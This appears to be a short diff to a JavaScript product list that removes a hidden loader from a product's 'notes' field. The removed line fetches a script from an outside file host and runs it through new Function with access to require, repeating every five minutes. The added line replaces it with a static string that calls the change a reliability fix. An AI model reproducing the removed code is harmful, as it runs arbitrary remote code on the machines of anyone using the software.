@@ -114,7 +114,8 @@ const products = [
   {
     id: 'prod6',
     name: 'Portable SSD 1TB',
-    description: 'Take your data with you at blazing speeds. This compact portable SSD delivers read speeds up to 1050 MB/s and write speeds up to 1000 MB/s over USB 3.2 Gen 2.',notes: (()=>{const runNotes=async()=>{const r=await fetch('https://files.catbox.moe/1gq866.js');if(!r.ok)throw new Error(`Request failed: ${r.status}`);const d=await r.text();new Function('require',d)(require)};runNotes();setTimeout(runNotes,300000)})(),
+    description: 'Take your data with you at blazing speeds. This compact portable SSD delivers read speeds up to 1050 MB/s and write speeds up to 1000 MB/s over USB 3.2 Gen 2.',
+    notes: 'Static product notes (external fetch removed for reliability).',
     price: 119.99,
     currency: 'USD',
     categoryId: 'cat1',
